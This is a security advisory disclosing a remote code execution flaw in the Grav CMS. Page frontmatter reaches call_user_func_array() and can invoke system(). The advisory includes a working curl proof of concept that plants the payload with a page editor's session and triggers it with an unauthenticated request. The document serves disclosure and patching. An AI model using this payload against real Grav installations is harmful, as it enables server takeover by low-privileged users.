# [H] Grav: Remote code execution via unrestricted callable in Blueprint::dynamicData()

## Summary
Severity: High
Advisory: GHSA-fj2p-qj2f-74v5
CVE: CVE-2026-64850
CWE: CWE-94
Ecosystem: Packagist
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-09-02
Source: https://github.com/advisories/GHSA-fj2p-qj2f-74v5
Type: github-advisory

## Affected
- Packagist: `getgrav/grav` — affected >=0 <2.0.7

## Details
### Summary
An account with the `admin.pages` permission (or `api.pages.write`) can run shell
commands on the server. The command executes whenever anyone — including an
unauthenticated visitor — opens the page.

### Details
`Blueprint::dynamicData()` (system/src/Grav/Common/Data/Blueprint.php:426) passes
a `Class::method` string and its arguments straight to `call_user_func_array()`
with no allowlist. The form plugin runs page frontmatter through this path
(form/classes/Form.php:432), so a page author controls the input.
`Grav\Common\Utils::arrayFilterRecursive($source,$fn)`
(system/src/Grav/Common/Utils.php:1169) is a public static that calls
`$fn($key,$value)`, so passing `system` as `$fn` and a command as the array key
runs the command.

### PoC
Placeholders: `<BASE_URL>` the site; `<SESSION_COOKIE>` an admin session cookie
for an account with `admin.pages`; `<ADMIN_NONCE>` the `admin-nonce` on any admin
page (`window.GravAdmin.config.admin_nonce`).

Save a "form" page whose field carries the callable directive:

    curl '<BASE_URL>/admin/pages/rcepoc' \
      -H 'Cookie: <SESSION_COOKIE>' \
      --data-urlencode 'task=save' \
      --data-urlencode 'admin-nonce=<ADMIN_NONCE>' \
      --data-urlencode 'data[folder]=rcepoc' \
      --data-urlencode 'data[name]=form' \
      --data-urlencode 'data[title]=x' \
      --data-urlencode 'data[content]=hi' \
      --data-urlencode "data[frontmatter]=forms:
      x:
        fields:
          y:
            type: text
            data-opts@:
              - 'Grav\Common\Utils::arrayFilterRecursive'
              - { 'echo GRAV-RCE-OK; id': 'x' }
              - system"

Trigger it as an unauthenticated visitor:

    curl '<BASE_URL>/rcepoc'

Success check: the GET response body begins with `GRAV-RCE-OK` followed by the
web-server user's `id` output (a line starting `uid=...`) — the command ran
during the unauthenticated request and its output is reflected in the response.


### Impact
Shell command execution as the web-server user, triggered by any visit to the
page, plantable by any holder of `admin.pages` or `api.pages.write`.

Trust boundary: crossed. `admin.pages` (or `api.pages.write`) grants page
editing, not code execution; the holder plants the payload and the code runs at
request time on any later view of the page.

## References
- https://github.com/getgrav/grav/security/advisories/GHSA-fj2p-qj2f-74v5
- https://nvd.nist.gov/vuln/detail/CVE-2026-64850
- https://github.com/getgrav/grav/commit/acffa34cbb0787fee87c609e0d6289e904fee33c
- https://github.com/getgrav/grav
- https://github.com/getgrav/grav/releases/tag/2.0.7
